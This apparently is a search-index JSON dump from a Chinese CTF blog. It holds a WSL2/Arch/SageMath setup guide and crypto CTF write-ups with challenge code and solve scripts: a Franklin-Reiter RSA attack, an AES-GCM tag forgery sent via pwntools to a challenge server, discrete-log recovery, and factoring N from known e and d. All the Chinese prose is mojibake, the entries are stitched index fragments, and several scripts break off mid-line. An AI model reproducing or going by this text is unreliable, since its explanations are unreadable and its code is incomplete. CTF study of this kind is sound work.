è¿ä¸Šå»ä¹‹åå‘ç°æ˜¯root ","date":"2024-12-12","objectID":"/vuln_hmv1/:2:1","tags":["æ¸—é€"],"title":"Vuln EvilBox: One \u0026 BoredHackerBlog_Cloud_AV","uri":"/vuln_hmv1/"},{"categories":["CTF"],"content":"å‰è¨€ ä¸ºä»€ä¹ˆè¦è¿™æ ·æå‘¢ï¼Œä¸»è¦æ˜¯è‡ªå·±å¤ªé—²äº†ï¼ˆè¢«æ‰“ï¼‰ï¼Œè¿˜æ˜¯å› ä¸ºwinç¯å¢ƒä¸‹çš„sagemathç‰ˆæœ¬ä½ï¼Œbugå¤šï¼Œè€Œä¸”è¿˜ä¸èƒ½pwnäº¤äº’ï¼Œè™½ç„¶åœ¨vmé‡Œé¢å¯ä»¥æï¼Œä½†æ˜¯æˆ‘åˆå«Œæ‰“å¼€è™šæ‹Ÿæœºéº»çƒ¦ï¼Œæ‰€ä»¥å°±wsl2äº†ã€‚ ","date":"2024-12-12","objectID":"/wsl2-arch-sagemath/:1:0","tags":["crypto"],"title":"wsl2 + arch + sagemath","uri":"/wsl2-arch-sagemath/"},{"categories":["CTF"],"content":"å®‰è£…wsl+arch åœ¨æ­¤æ¨èè¿™ä¸ªè§†é¢‘æ•™å­¦ï¼Œä¸»è¦çš„æ­¥éª¤å°±æ˜¯ä»¥ä¸‹å‡ æ­¥ï¼ˆæˆ‘æ˜¯win11ï¼‰ 1.æ§åˆ¶é¢æ¿â†’ç¨‹åºâ†’å¯ç”¨æˆ–å…³é—­WindowsåŠŸèƒ½â†’æ‰“å¼€é€‚ç”¨äºLinuxçš„Windowså­ç³»ç»Ÿâ†’é‡å¯ã€‚ tips:å¦‚æœæ²¡æœ‰æˆåŠŸï¼Œå¯ä»¥å»çœ‹çœ‹æ˜¯å¦å¼€äº†ç®¡ç†å‘˜æƒé™ 2.æ‰“å¼€powershellâ†’è¾“å…¥ï¼šwsl â€“install â€“no-distributionâ†’wsl â€“update tips:--no-distributionä½œç”¨æ˜¯å®‰è£…wslæ—¶ä¸å®‰è£…linuxå‘è¡Œç‰ˆï¼Œå¦‚æœä¸åŠ çš„è¯ä¼šé»˜è®¤å®‰è£…ä¹Œç­å›¾ 3.æ‰“å¼€cç›˜â†’ç”¨æˆ·â†’ä¸ªäººæ–‡ä»¶å¤¹â†’åˆ›å»ºæ–‡æœ¬æ–‡ä»¶ï¼ˆä¸è¦åŠ åç¼€ï¼‰â†’å‘½å.wslconfigâ†’ç¼–è¾‘è¾“å…¥ [experimental] autoMemoryReclaim=gradual networkingMode=mirrored dnsTunneling=true firewall=true autoProxy=true 4.ä¸‹è½½archlinuxï¼Œé“¾æ¥ï¼Œä¸‹è½½zipæ–‡ä»¶ï¼Œå‹ç¼©åˆ°æœ¬åœ°ï¼Œè®°ä½å‹ç¼©åˆ°æ–°å»ºæ–‡ä»¶å¤¹é‡Œé¢ï¼Œæˆ‘å‘½åä¸ºarch 5.ç›´æ¥åŒå‡»arch.exe 6.è¿›è¡Œèº«ä»½æ³¨å†Œï¼Œç°åœ¨é»˜è®¤æ˜¯rootï¼Œè¾“å…¥passwdè®¾ç½®å¯†ç  7.è®¾ç½®ä¸ªå¸¸ç”¨è´¦æˆ·è¾“å…¥ echo \"%wheel ALL=(ALL)ALL\"/etc/sudoers.d/wheel useradd -m-G wheel-s /bin/bash fusername Arch.exe config --default-user fusername é€€å‡ºä¹‹åé‡è¿› 8.é…ç½® sudo pacman-key --init sudo pacman-key --populate sudo pacman -Syy archlinux-keyring 9.æ¢æºï¼Œæ¨èæ¸…åæº sudo nano /etc/pacman.d/mirrorlist åœ¨æœ€å‰é¢ç›´æ¥åŠ ä¸Š Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch ç„¶åctrl+sï¼Œctrl+xé€€å‡º ","date":"2024-12-12","objectID":"/wsl2-arch-sagemath/:2:0","tags":["crypto"],"title":"wsl2 + arch + sagemath","uri":"/wsl2-arch-sagemath/"},{"categories":["CTF"],"content":"å®‰è£…ä»¥åŠè°ƒç”¨sagemath ","date":"2024-12-12","objectID":"/wsl2-arch-sagemath/:3:0","tags":["crypto"],"title":"wsl2 + arch + sagemath","uri":"/wsl2-arch-sagemath/"},{"categories":["CTF"],"content":"å®‰è£… è¾“å…¥ sudo pacman -Sy sagemath å®‰è£…ä¹‹åsageè°ƒç”¨ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½å‡ºæ¥ï¼Œå¯ä»¥çš„è¯å°±æˆåŠŸäº† å®‰è£…ç¬¬ä¸‰æ–¹åº“çš„å‘½ä»¤æ˜¯ pacman -S python-xyz ","date":"2024-12-12","objectID":"/wsl2-arch-sagemath/:3:1","tags":["crypto"],"title":"wsl2 + arch + sagemath","uri":"/wsl2-arch-sagemath/"},{"categories":["CTF"],"content":"è°ƒç”¨ æ¨èæ–¹æ³•vscode vscodeå·¦ä¸‹è§’æœ‰ä¸ªè“è‰²æ–¹å—ï¼Œç‚¹å‡»åè¿æ¥wslï¼Œå¦‚æœè¦ä¸‹è½½æ’ä»¶ç›´æ¥ä¸‹å°±è¡Œäº†ï¼Œè°ƒå‡ºç»ˆç«¯ï¼Œè¾“å…¥ mkdir sageï¼Œå»æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿›å…¥è¿™ä¸ªæ–‡ä»¶å¤¹åæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚1.ipynbï¼ˆåç¼€åªèƒ½æ˜¯è¿™ä¸ªï¼‰ï¼Œç„¶åä¼šä¸‹è½½æ’ä»¶ï¼Œå…¨éƒ¨ä¸‹è½½å®Œåå³ä¸Šè§’é€‰æ‹©å†…æ ¸ï¼Œè¾“å…¥sageçš„ä»£ç çœ‹çœ‹èƒ½ä¸èƒ½ç”¨ï¼Œèƒ½ç”¨å°±è¡Œ ","date":"2024-12-12","objectID":"/wsl2-arch-sagemath/:3:2","tags":["crypto"],"title":"wsl2 + arch + sagemath","uri":"/wsl2-arch-sagemath/"},{"categories":["CTF"],"content":"å‰è¨€ æ‰“äº†é¦™æ¸¯ï¼Œæ—¥æœ¬çš„æ¯”èµ›ï¼Œè¿˜æœ‰èœ€é“å±±ï¼Œæ„Ÿè§‰è¿™å‡ ä¸ªé¢˜éƒ½å¾ˆå¥½ï¼Œä½†æ˜¯éƒ½ä¸ä¼šï¼ˆï¼‰ï¼Œå†™ä¸ªè®°å½•ä¸€ä¸‹ï¼Œé¡ºä¾¿æ€»ç»“ ","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:1:0","tags":["crypto"],"title":"ä¸²çƒ§_cryptoå¤ç°","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:0","tags":["crypto"],"title":"ä¸²çƒ§_cryptoå¤ç°","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"seccon/reiwa_rot13 task from Crypto.Util.number import * import codecs import string import random import hashlib from Crypto.Cipher import AES from Crypto.Random import get_random_bytes from flag import flag p = getStrongPrime(512) q = getStrongPrime(512) n = p*q e = 137 key = ''.join(random.sample(string.ascii_lowercase, 10)) rot13_key = codecs.encode(key, 'rot13') key = key.encode() rot13_key = rot13_key.encode() print(\"n =\", n) print(\"e =\", e) print(\"c1 =\", pow(bytes_to_long(key), e, n)) print(\"c2 =\", pow(bytes_to_long(rot13_key), e, n)) key = hashlib.sha256(key).digest() cipher = AES.new(key, AES.MODE_ECB) print(\"encyprted_flag = \", cipher.encrypt(flag)) æ€è·¯ï¼š å½“æ—¶æ¯”èµ›ç¬¬ä¸€çœ¼çœ‹è¿‡å»ï¼Œeå¾ˆå°ï¼Œå°±åœ¨æƒ³æ˜¯ä¸æ˜¯å¯Œå…°å…‹æ—ï¼Œç„¶åæƒ³åˆ©ç”¨rot13çš„æ€§è´¨å»å†™ï¼Œå‘ç°æ²¡ç”¨ï¼Œç„¶åå°±æƒ³é€šè¿‡c1å’Œc2ç›´æ¥å»æ„é€ å¯Œå…°å…‹æ—æ”»å‡»ï¼Œå‘ç°ä¸€ç›´ä¸å¯¹ã€‚ æ­£ç¡®æƒ³æ³•åº”è¯¥æ˜¯bytes_to_longè½¬æ¢çš„æ—¶å€™å½¢æˆçš„å¯Œå…°å…‹æ—ï¼Œæ¯ä¸€ä½å¯ä»¥çœ‹ä½œ $$256^i$$ï¼Œç„¶åç›¸åŠ ï¼Œå®³è ¢äº†ã€‚ exp from Crypto.Util.number import * import hashlib import itertools from tqdm import tqdm from Crypto.Cipher import AES n = 105270965659728963158005445847489568338624133794432049687688451306125971661031124713900002127418051522303660944175125387034394970179832138699578691141567745433869339567075081508781037210053642143165403433797282755555668756795483577896703080883972479419729546081868838801222887486792028810888791562604036658927 e = 137 c1 = 16725879353360743225730316963034204726319861040005120594887234855326369831320755783193769090051590949825166249781272646922803585636193915974651774390260491016720214140633640783231543045598365485211028668510203305809438787364463227009966174262553328694926283315238194084123468757122106412580182773221207234679 c2 = 54707765286024193032187360617061494734604811486186903189763791054142827180860557148652470696909890077875431762633703093692649645204708548602818564932535214931099060428833400560189627416590019522535730804324469881327808667775412214400027813470331712844449900828912439270590227229668374597433444897899112329233 encyprted_flag = b\"\\xdb'\\x0bL\\x0f\\xca\\x16\\xf5\\x17\u003e\\xad\\xfc\\xe2\\x10$(DVsDS~\\xd3v\\xe2\\x86T\\xb1{xL\\xe53s\\x90\\x14\\xfd\\xe7\\xdb\\xddf\\x1fx\\xa3\\xfc3\\xcb\\xb5~\\x01\\x9c\\x91w\\xa6\\x03\\x80\u0026\\xdb\\x19xu\\xedh\\xe4\" def franklinReiter(n,e,r,c1,c2): R.\u003cX\u003e = Zmod(n)[] f1 = X^e - c1 f2 = (X + r)^e - c2 return Integer(n-(gcd(f1,f2)).coefficients()[0]) def gcd(a, b): if(b == 0): return a.monic() else: return gcd(b, a % b) def gen(): for perm in itertools.product([13,-13],repeat=10): l = sum([256**i*per for i,per in enumerate(perm)]) yield l for val in tqdm(gen()): m = franklinReiter(n,e,val,c1,c2) try: m = long_to_bytes(m).decode() print(m) break except: continue key = hashlib.sha256(m.encode()).digest() cipher = AES.new(key, AES.MODE_ECB) print(\"encyprted_flag = \", cipher.decrypt(encyprted_flag)) ","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:1","tags":["crypto"],"title":"ä¸²çƒ§_cryptoå¤ç°","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"seccon/dual_summon task from Crypto.Cipher import AES import secrets import os import signal signal.alarm(300) flag = os.getenv('flag', \"SECCON{sample}\") keys = [secrets.token_bytes(16) for _ in range(2)] nonce = secrets.token_bytes(16) def summon(number, plaintext): assert len(plaintext) == 16 aes = AES.new(key=keys[number-1], mode=AES.MODE_GCM, nonce=nonce) ct, tag = aes.encrypt_and_digest(plaintext) return ct, tag # When you can exec dual_summon, you will win def dual_summon(plaintext): assert len(plaintext) == 16 aes1 = AES.new(key=keys[0], mode=AES.MODE_GCM, nonce=nonce) aes2 = AES.new(key=keys[1], mode=AES.MODE_GCM, nonce=nonce) ct1, tag1 = aes1.encrypt_and_digest(plaintext) ct2, tag2 = aes2.encrypt_and_digest(plaintext) # When using dual_summon you have to match tags assert tag1 == tag2 print(\"Welcome to summoning circle. Can you dual summon?\") for _ in range(10): mode = int(input(\"[1] summon, [2] dual summon \u003e\")) if mode == 1: number = int(input(\"summon number (1 or 2) \u003e\")) name = bytes.fromhex(input(\"name of sacrifice (hex) \u003e\")) ct, tag = summon(number, name) print(f\"monster name = [---filtered---]\") print(f\"tag(hex) = {tag.hex()}\") if mode == 2: name = bytes.fromhex(input(\"name of sacrifice (hex) \u003e\")) dual_summon(name) print(\"Wow! you could exec dual_summon! you are master of summoner!\") print(flag) æ€è·¯ï¼š é¦–å…ˆæ˜¯åœ¨ $$x^{128}+x^7+x^2+x+1$$å®šä¹‰åœ¨ $$GF(2^{128})$$ä¸Šçš„å¤šé¡¹å¼ï¼ŒAES-GCMç”Ÿæˆçš„æ ‡ç­¾æ˜¯ $$T=(P+H_1)*H+H_0$$,Håˆæ˜¯å’Œnotionç»‘å®šçš„ï¼Œå³notionä¸€æ ·ç”Ÿæˆçš„ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘å‘ä¸¤ä¸ªä¸€æ ·çš„ï¼Œç”Ÿæˆçš„ $$T^',T$$åŒºåˆ«å°±åœ¨äºPï¼Œé‚£ä¹ˆ $$T+T^'=(P+P^')*H$$,é‚£ä¹ˆHå°±å‡ºæ¥äº†ï¼Œè‰ï¼Œä¸ºä»€ä¹ˆæˆ‘å½“æ—¶æ²¡æƒ³åˆ°ï¼ï¼ï¼ e x p import pwn from sage.all import * pwn.context(encoding='ascii') if pwn.args.LOCAL: io = pwn.process(['python', 'server.py']) else: io = pwn.remote('dual-summon.seccon.games', '2222') var('x') F = GF(2**128, 'x', modulus=x**128 + x**7 + x**2 + x + 1) def reverse(f): return F(list(f)[::-1]) def hex2f(h): return reverse(F.from_bytes(bytes.fromhex(h))) def f2hex(f): return reverse(f).to_bytes()[-16:].hex() def summon(idx, name): io.sendline('1') io.sendline(str(idx)) io.sendline(f2hex(name)) io.recvuntil('tag(hex) = ') return hex2f(io.recvline().decode()) trash1 = summon(1, F(0)) hh1 = trash1 + summon(1, F(1)) trash2 = summon(2, F(0)) hh2 = trash2 + summon(2, F(1)) ans = (trash1 + trash2) / (hh1 + hh2) io.sendline('2') io.sendline(f2hex(ans)) io.interactive() ","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:2","tags":["crypto"],"title":"ä¸²çƒ§_cryptoå¤ç°","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"å¼ºç½‘æ¯é’å°‘å¹´2024/easymath task from Crypto.Util.number import * from gmpy2 import next_prime from secrets import flag l=2331 key=0 for k in range(2**(l-1),2**l): s=bin(k)[2:] if(k%2==1 and '1111' not in s and '0000' not in s): key+=1 p=next_prime(key) q=getPrime(2048) n=p*q e=65537 m=bytes_to_long(flag) c=pow(m,e,n) print(f'n=',n) print(f'c=',c) ''' n=739243847275389709472067387827484120222494013590074140985399787562594529286597003777105115865446795908819036678700460141950875653695331369163361757157565377531721748744087900881582744902312177979298217791686598853486325684322963787498115587802274229739619528838187967527241366076438154697056550549800691528794136318856475884632511630403822825738299776018390079577728412776535367041632122565639036104271672497418509514781304810585503673226324238396489752427801699815592314894581630994590796084123504542794857800330419850716997654738103615725794629029775421170515512063019994761051891597378859698320651083189969905297963140966329378723373071590797203169830069428503544761584694131795243115146000564792100471259594488081571644541077283644666700962953460073953965250264401973080467760912924607461783312953419038084626809675807995463244073984979942740289741147504741715039830341488696960977502423702097709564068478477284161645957293908613935974036643029971491102157321238525596348807395784120585247899369773609341654908807803007460425271832839341595078200327677265778582728994058920387721181708105894076110057858324994417035004076234418186156340413169154344814582980205732305163274822509982340820301144418789572738830713925750250925049059 c=229043746793674889024653533006701296308351926745769842802636384094759379740300534278302123222014817911580006421847607123049816103885365851535481716236688330600113899345346872012870482410945158758991441294885546642304012025685141746649427132063040233448959783730507539964445711789203948478927754968414484217451929590364252823034436736148936707526491427134910817676292865910899256335978084133885301776638189969716684447886272526371596438362601308765248327164568010211340540749408337495125393161427493827866434814073414211359223724290251545324578501542643767456072748245099538268121741616645942503700796441269556575769250208333551820150640236503765376932896479238435739865805059908532831741588166990610406781319538995712584992928490839557809170189205452152534029118700150959965267557712569942462430810977059565077290952031751528357957124339169562549386600024298334407498257172578971559253328179357443841427429904013090062097483222125930742322794450873759719977981171221926439985786944884991660612824458339473263174969955453188212116242701330480313264281033623774772556593174438510101491596667187356827935296256470338269472769781778576964130967761897357847487612475534606977433259616857569013270917400687539344772924214733633652812119743 ''' æ€è·¯ï¼š ç›´æ¥çœ‹ä¸Šå»å°±æ˜¯è®©ä½ å»åˆ†è§£ï¼Œæˆ–è€…æ˜¯ç›´æ¥æ±‚pçš„ï¼Œå…¶å®è¿™æ˜¯ä¸€ç§ç®—æ³•ï¼Œç”¨çŸ©é˜µçŠ¶æ€æ–¹ç¨‹ï¼Œå†ç»“åˆçŸ©é˜µå¿«é€Ÿå¹‚ï¼Œå°±å¯ä»¥å¾ˆå¿«çš„å‡ºæ¥ç»“æœ e x p states = [ (0, 1), (0, 2), (0, 3), (1, 1), (1, 2), (1, 3) ] state_idx = { state: idx for idx, state in enumerate(states) } idx_state = { idx: state for idx, state in enumerate(states) } size = len(states) T = [ [0]*size for _ in range(size) ] for idx_from, (last_bit, count) in enumerate(states): for new_bit in [0, 1]: if new_bit == last_bit: new_count = count + 1 else: new_count = 1 if new_count \u003e= 4: continue idx_to = state_idx[ (new_bit, new_count) ] T[idx_to][idx_from] += 1 def mat_mul(a, b): result = [ [0]*size for _ in range(size) ] for i in range(size): for j in range(size): for k in range(size): result[i][j] += a[i][k] * b[k][j] return result def mat_pow(mat, power): result = [ [1 if i == j else 0 for j in range(size)] for i in range(size) ] # å•ä½çŸ©é˜µ while power \u003e 0: if power % 2 == 1: result = mat_mul(mat, result) mat = mat_mul(mat, mat) power //= 2 return result initial_state = [0]*size initial_state[state_idx[(1, 1)]] = 1 l = 2331 T_pow = mat_pow(T, l - 1) final_state = [0]*size for i in range(size): for j in range(size): final_state[i] += T_pow[i][j] * initial_state[j] key = 0 for id","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:3","tags":["crypto"],"title":"ä¸²çƒ§_cryptoå¤ç°","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"èœ€é“å±±/Something like coppersmith task from Crypto.Util.number import * from Crypto.Cipher import AES from Crypto.Util.Padding import pad import hashlib from secret import flag p = 6302810904265501037924401786295397288170843149817176985522767895582968290551414928308932200691953758726228011793524154509586354502691822110981490737900239 g = 37 x = getRandomRange(1, p) key = hashlib.md5(str(x).encode()).digest() aes = AES.new(key=key, mode=AES.MODE_ECB) print(f\"y = {pow(g, x, p)}\") print(f\"xl = {x \u0026 (2**404 - 1)}\") print(f\"enc = {aes.encrypt(pad(flag, 16))}\") \"\"\" y = 1293150376161556844462084321627758417728307246932113125521569554783424543983527961886280946944216834324374477189528743754550041489359187752209421536046860 xl = 17986330879434951085449288256517884655391850545705434564933459034981508996937405053663301303792832616366656593647019909376 enc = b'\\x08[\\x94\\xc1\\xc2\\xc3\\xb9\"C^\\xd6P\\xf9\\x0c\\xbb\\r\\r\\xaf\u0026\\x94\\x8cm\\x02s\\x87\\x8b\\x1c\\xb3\\x92\\x81H\\xe7\\xc6\\x190a\\xca\\x91j\\xc0@(\\xc5Fw\\x95\\r\\xee' \"\"\" æ€è·¯ï¼š å‘ç° $$p-1$$å¯ä»¥åˆ†è§£ï¼Œåˆ©ç”¨å°æ•°ç›´æ¥åˆ†è§£ï¼Œæ±‚å‡ºæ¥106bitsï¼Œxçš„ä½ä½ç›´æ¥crtï¼Œç„¶åçˆ†ç ´å‡ ä½å°±å‡ºæ¥äº† e x p y = 1293150376161556844462084321627758417728307246932113125521569554783424543983527961886280946944216834324374477189528743754550041489359187752209421536046860 xl = 17986330879434951085449288256517884655391850545705434564933459034981508996937405053663301303792832616366656593647019909376 enc = b'\\x08[\\x94\\xc1\\xc2\\xc3\\xb9\"C^\\xd6P\\xf9\\x0c\\xbb\\r\\r\\xaf\u0026\\x94\\x8cm\\x02s\\x87\\x8b\\x1c\\xb3\\x92\\x81H\\xe7\\xc6\\x190a\\xca\\x91j\\xc0@(\\xc5Fw\\x95\\r\\xee' p = 6302810904265501037924401786295397288170843149817176985522767895582968290551414928308932200691953758726228011793524154509586354502691822110981490737900239 g = 37 from Crypto.Util.number import * from Crypto.Cipher import AES import hashlib #2 Â· 385057 Â· 727646221919\u003c12\u003e Â· 193893885660581\u003c15\u003e Â· 193166780451443059\u003c18\u003e Â· 3881671740574461385603964379125531\u003c34\u003e Â· 77364837756797328321829387679372821139010103152781295726133301368685957\u003c71\u003e r2=193166780451443059 r3=3881671740574461385603964379125531 r4=77364837756797328321829387679372821139010103152781295726133301368685957 r=r2*r3*r4 Fp = GF(p) #xr = discrete_log(Fp(pow(y,r,p)), Fp(pow(g,r,p)), operation=\"*\", ord=(p-1)//r) xr=57328333290257638351589051968512 x = crt([xl, xr], [2^404, (p-1)//r]) for i in range(2^10): temp = x + i*lcm([2^404, (p-1)//r]) if(temp \u003e p-1): break key = hashlib.md5(str(temp).encode()).digest() aes = AES.new(key=key, mode=AES.MODE_ECB) print(aes.decrypt(enc)) ","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:4","tags":["crypto"],"title":"ä¸²çƒ§_cryptoå¤ç°","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"èœ€é“å±±/ç­¾åˆ°!? task import hashlib import gmpy2 from Crypto.Util.number import * flag = b'' m = bytes_to_long(flag) a = getPrime(1024);b = getPrime(1024);c = getPrime(1024);d = getPrime(128);n = getPrime(1024) y = 0 for i in range(n+1): x = a*i+b y += (x//c)*i if isPrime(y): pass else: y = gmpy2.next_prime(y) tmp = hashlib.md5(str(y).encode()).hexdigest() cc = pow(d,int(tmp,16),n) e = 52595 c3 = pow(m,e,y) c4 = pow(a*m+b,e,y) print('a =',a) print('b =',b) print('c =',c) print('d =',d) print('n =',n) print('cc =',cc) print('c3 =',c3) print('c4 =',c4) # a = 111406501658261575231314234156049408466629183228824951940397996549233343837444378602865612803520661162092930300450227752136992834681100817745708350750328806415942948297139334928206997684336812509277385194519252428443612078118898709910123899406877252165189871184174372173644257644751683554571917518602985248103 # b = 105754676330138681072874983469472331489357433467464632569519728162042635815478944541148477139634812590504509864018789141646023167940434519693396156652820504954321975234632684842726055170039476517204102162821838097200563406354332901840869790790015364563201564244853988381159598703692897790765599565893345380553 # c = 170600113386807592462858319531540617567133570960670217596634485327958954420566724690918464046407772634147753234450737353193173923873879958589824005123545638184186453602233634037809629812111243183450002707175703333920828461245731172668838771751457387207779427008047454548463398397079552688864699792002976130047 # d = 229823065384822950015724955215847476631 # n = 169428502732446427714165121824913735747920403586738853921495983139840483604966163669399379093896888954652663456556496947292418676356981468237136780175047349167561875551277606897449804926885192045760368051311243166090981061101913245493065268528634952461907634111084108803207099139506693313918834075542826388183 # cc = 105324189115602620621800798531371526317853537119154266873657796691360779628410005302892575043351618666760506544724245300953227618282253336044824499240524905915476071538182232622771476344880513465689824790881603214009332398038930113198889292160815386819010434380814610557831376377280232817587639852364108539892 # c3 = 791801877941025556812260671377895956461402542450910806211264471681160334454968210834058573374802678147030803278793623022600774676606263064237697305258809520983007689647782562591531551137322198839457388757360504835352506363286012791482381915207800512880078672338934869429374580298570299136345411005736381918329554791587303420005844148692211002120828912548145333101329366616120459060822278273689238720580513363138874807500470690610311215233669314430430554144017703130663205211791135140813550629558977548476426876112982216083736966681702987597722820852894624586687261277977164491919429492650781084296080288020330875247574855906390404509845311187888602482142661083771230000178356724801659025002251056321173755782500071361114235931347064100961296562902176010402092225439511324625249209554560052627349307173707304259200397468217911136832133364420684914378754649851955359890480612161233059263522713390654506714661592991514955637304 # c4 = 10192392140000709226779047816102410379989295488085905279342261532922281312983533344247863222018254472453030181639307253067276326364502240818954781592338390656561160688892609713540052729900686290778105893183880488799488309568381420345266346723577640757282208294402213347640987837466355562725803531763148917371941078562909025541786168608157137675690679993859387074547195693639306677490798812441131812460417892075569888708639917765050200488386084418736591195347298092121318463941167250369161241843727653089619800261027673290600474169228647053856528885234415883022958077183412358232078225869839285326293594485889893799964700459966806042546115084665264293139731146842547623505675676180593342164352556684592805723899145846911329057615946523424327497198291393970986995190706116949313230986385201668253399829989370585983484432587689051140566433600130860013394644099869050309515696468764559722","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:5","tags":["crypto"],"title":"ä¸²çƒ§_cryptoå¤ç°","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"å‰è¨€ é¢ï¼Œæ²¡æœ‰è¿›çº¿ä¸‹ï¼Œå¾ˆé—æ†¾ï¼Œ24åï¼Œæ„Ÿè§‰ç®—æ˜¯å°½åŠ›äº†å§ï¼Œå¯†ç å·®ä¸€ä¸ªï¼Œpwnå·®ä¸€ä¸ªï¼Œå®³ï¼ŒåŠ æ²¹åŠ æ²¹ ","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:1:0","tags":["crypto"],"title":"å›½åŸæ¯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:2:0","tags":["crypto"],"title":"å›½åŸæ¯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"baby_rsa task from secret import flag from Crypto.Util.number import* from gmpy2 import* flag = b'D0g3xGC{****************}' def gen_key(p, q): public_key = p*p*q e = public_key n = p*q phi_n = (p-1)*(q-1) private_key = inverse(e,phi_n) return public_key,private_key,e p = getPrime(512) q = getPrime(512) N,d,e = gen_key(p,q) c = gmpy2.powmod(bytes_to_long(flag),e,N) print(N) print(d) print(c) ''' n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489 d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009 c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175 ''' æ€è·¯ï¼šç¬¬ä¸€å¼€å§‹è ¢äº†ï¼Œå…‰æƒ³ç€æ•°è®ºå»åˆ†è§£ï¼ˆï¼‰ï¼Œå®é™…ä¸Šå°±æ˜¯å·²çŸ¥edå»åˆ†è§£nçš„æ¿å­ï¼Œå¦‚æœä½ ä¸å–œæ¬¢è¿™æ ·å†™ï¼Œä¹Ÿå¯ä»¥å½“åšSchmidt-Samoaå¯†ç ç³»ç»Ÿå»å†™ï¼Œä¹Ÿå°±æ˜¯N=ppq exp å·²çŸ¥edåˆ†è§£n from Crypto.Util.number import * from gmpy2 import * import random N = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489 d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009 c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175 e=N def divide_pq(e, d, n): k = e*d - 1 while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x \u003e 1 and gmpy2.gcd(x-1, n) \u003e 1: p = gmpy2.gcd(x-1, n) return (p, n//p) p,q=divide_pq(e,d,N) print(p) print(q) p=79383306134947424796765954824015864390078583902302636527808026816952829265734994276325635699794430479702821928289625118815325887659007643266349948296318807317582134486508441170880662166050894191177907221139536796434252181713457621118705394280613626457816073091127751846643375030866224594198586067838678842497 q=6794928570435044209030833867549069695672243994881591721813098774596108837421399268704431701833380412609102066316818356763155159992836983459691442967908337 phi=(p-iroot(p,2)[0])*(q-1) d=inverse(e,phi) m=pow(c,d,(q)) print(long_to_bytes(m)) Schmidt-Samoaå¯†ç ç³»ç»Ÿ from gmpy2 import* from libnum import* N = 53940389487194577982720217406130297034108245592836413744496284435903992416","date":"2024-12-12","objectID":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/:2:1","tags":["crypto"],"title":"å›½åŸæ¯2024_crypto","uri":"/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024_crypto/"},{"categories":["CTF"],"content":"Curve task #sagemath from Crypto.Util.number import * def add(P, Q): (x1, y1) = P (x2, y2) = Q x3 = (x1*y2 + y1*x2) * inverse(1 + d*x1*x2*y1*y2, p) % p y3 = (y1*y2 - a*x1*x2) * inverse(1 - d*x1*x2*y1*y2, p) % p return (x3, y3) def mul(x, P): Q = (0, 1) while x \u003e 0: if x % 2 == 1: Q = add(Q, P) P = add(P, P) x = x \u003e\u003e 1 return Q p = 64141017538026690847507665744072764126523219720088055136531450296140542176327 a = 362 d = 7 e=0x10001 gx=bytes_to_long(b'D0g3xGC{*****************}') PR.\u003cy\u003e=PolynomialRing(Zmod(p)) f=(d*gx^2-1)*y^2+(1-a*gx^2) gy=int(f.roots()[0][0]) assert 